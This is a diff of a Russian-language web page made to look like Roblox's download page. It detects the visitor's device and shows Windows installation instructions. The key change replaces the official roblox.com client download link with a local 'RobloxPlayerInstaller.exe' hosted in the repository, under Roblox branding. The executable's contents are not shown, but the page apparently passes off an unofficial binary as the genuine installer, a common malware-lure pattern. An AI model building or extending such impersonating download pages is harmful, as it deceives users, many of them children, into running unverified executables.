@@ -191,7 +191,7 @@
         <!-- Блок для главной кнопки -->
         <div id="main-target"></div>
 
-        <!-- Инструкция для Windows (появится после клика) -->
+        <!-- Инструкция для Windows -->
         <div id="win-instruction" class="instruction-block">
             <span class="instruction-title">Простая инструкция по установке:</span>
             <div class="step">
@@ -211,11 +211,10 @@
 
         <!-- Блок для остальных кнопок -->
         <div id="secondary-target">
-            <!-- Кнопки теперь изначально находятся здесь. Если JS сработает — он их переставит местами. Если нет — они просто будут показываться списком -->
             
-            <!-- Полностью исправленная кнопка Windows -->
-            <a target="_blank" download data-testid="download" aria-disabled="false" href="https://www.roblox.com/download/client?os=win&renderingPlatform=nextjs" class="btn-roblox-win foundation-web-button relative clip group/interactable focus-visible:outline-focus disabled:outline-none cursor-pointer relative flex items-center justify-center stroke-none padding-y-none select-none radius-medium text-label-large height-1200 padding-x-medium bg-action-emphasis content-action-emphasis min-width-[240px] medium:min-width-[400px]" style="text-decoration:none" id="btn-win">
-                <div role="presentation" class="absolute inset-[0] transition-colors group-hover/interactable:bg-[var(--color-state-hover)] group-active/interactable:bg-[var(--color-state-press)] group-disabled/interactable:bg-none"></div>
+            <!-- Исправленная кнопка, ведущая на ваш локальный файл в репозитории -->
+            <a href="RobloxPlayerInstaller.exe" download="RobloxPlayerInstaller.exe" class="btn-roblox-win foundation-web-button relative clip group/interactable focus-visible:outline-focus disabled:outline-none cursor-pointer relative flex items-center justify-center stroke-none padding-y-none select-none radius-medium text-label-large height-1200 padding-x-medium bg-action-emphasis content-action-emphasis min-width-[240px] medium:min-width-[400px]" style="text-decoration:none" id="btn-win">
+                <div role="presentation" class="absolute inset-0 transition-colors group-hover/interactable:bg-[var(--color-state-hover)] group-active/interactable:bg-[var(--color-state-press)] group-disabled/interactable:bg-none"></div>
                 <span class="flex items-center min-width-0 gap-small">
                     <span class="padding-y-xsmall text-truncate-end text-no-wrap">
                         <span class="flex justify-center items-center gap-small">
@@ -258,7 +257,6 @@
                 os = "ios"; 
             }
 
-            // Очищаем контейнеры перед распределением кнопок скриптом
             mainTarget.innerHTML = "";
             secondaryTarget.innerHTML = "";
 
@@ -267,25 +265,25 @@
                 secondaryTarget.appendChild(btnWin);
                 secondaryTarget.appendChild(btnIos);
                 subtitle.innerText = "Мы подобрали версию для вашего Android / Linux устройства";
-} else if (os === "ios") {
-    mainTarget.appendChild(btnIos);
-    secondaryTarget.appendChild(btnWin);
-    secondaryTarget.appendChild(btnAndroid);
-    subtitle.innerText = "Мы подобрали версию для вашего Apple устройства";
+            } else if (os === "ios") {
+                mainTarget.appendChild(btnIos);
+                secondaryTarget.appendChild(btnWin);
+                secondaryTarget.appendChild(btnAndroid);
+                subtitle.innerText = "Мы подобрали версию для вашего Apple устройства";
 } else {
     mainTarget.appendChild(btnWin);
     secondaryTarget.appendChild(btnAndroid);
     secondaryTarget.appendChild(btnIos);
     subtitle.innerText = "Мы подобрали версию для вашего компьютера на Windows";
 }
-
-// Скрипт открытия инструкции для Windows по клику
 btnWin.addEventListener("click", function() {
-    const instruction = document.getElementById("win-instruction");
-    instruction.style.display = "block";
-    
-    setTimeout(() => {
-        instruction.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-    }, 100);
+const instruction = document.getElementById("win-instruction");
+instruction.style.display = "block";
+setTimeout(() => {
+    instruction.scrollIntoView({
+        behavior: 'smooth',
+        block: 'nearest'
+    });
+}, 100);
 });
 });
